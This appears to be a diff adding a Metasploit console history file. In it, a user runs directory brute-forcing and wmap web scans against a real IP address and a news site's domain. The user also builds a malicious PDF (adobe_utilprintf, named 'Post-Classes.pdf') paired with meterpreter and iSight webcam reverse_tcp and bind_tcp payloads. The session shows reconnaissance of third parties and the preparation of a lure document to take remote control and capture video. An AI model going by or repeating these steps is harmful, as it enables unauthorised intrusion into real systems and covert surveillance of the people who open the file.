@@ -1,0 +1,67 @@
+db_status
+search asp
+search 'asp'
+search 'aspx'
+search type:payload platform:mac
+search type:payload
+search type:exploit platform:osx86 adobe pdf
+search type:exploit platform:osx adobe pdf
+search type:exploit platform:windows pdf
+search type:exploit platform:windows adobe pdf
+quit
+search type:exploit platform:OSX
+search type:exploit platform:OSX isight
+search type:exploit platform:osx isight
+search type:exploit platform:osx isight tcp
+search type:exploit platform:osx
+search type:exploit platform:osx86
+search type:payload platform:osx isight
+use auxiliary/scanner/http/
+use auxiliary/scanner/http/files_dir 
+show options
+set RHOST 104.31.1.164
+set RHOSTS 104.31.1.164
+exploit
+use auxiliary/scanner/http/brute_dirs 
+show options
+help
+get RHOSTS
+set RHOSTS 104.31.1.164
+exploit
+load wmap
+wmap_sites -a https://104.31.1.164
+wmap_sites -l
+wmap_targets -d 0
+wmap_run -t
+wmap_run -e
+use auxiliary/scanner/http/ssll
+use auxiliary/scanner/http/ssl
+get RHOSTS
+set RHOSTS 104.31.1.164
+wmap_sites -l
+wmap_run -e
+wmap_sites -l
+wmap_sites
+wmap_targets -l
+ wmap_sites -a http://courant.com
+wmap_sites -l
+wmap_targets -l
+wmap_targets -h
+wmap_targets -d 0
+wmap_targets -l
+wmap_targets -h
+wmap_targets -c
+wmap_sites -l
+wmap_targets -d 0
+wmap_targets -l
+search type:exploit platform:windows adobe pdf
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME Post-Classes.pdf
+set PAYLOAD payload/osx/x64/meterpreter_reverse_tcp
+info
+search type:payload platform:osx
+show options
+set PAYLOAD payload/osx/x86/isight/reverse_tcp
+set PAYLOAD payload/osx/x86/isight/bind_tcp
+show info
+exit
